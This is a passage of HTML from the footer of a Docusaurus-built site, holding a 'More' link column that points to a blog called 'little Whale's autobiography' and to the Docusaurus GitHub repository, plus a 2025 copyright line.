class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/blog">little Whale&#x27;s autobiography</a></li><li class="footer__item"><a href="https://github.com/facebook/docusaurus" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 My Project, Inc. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>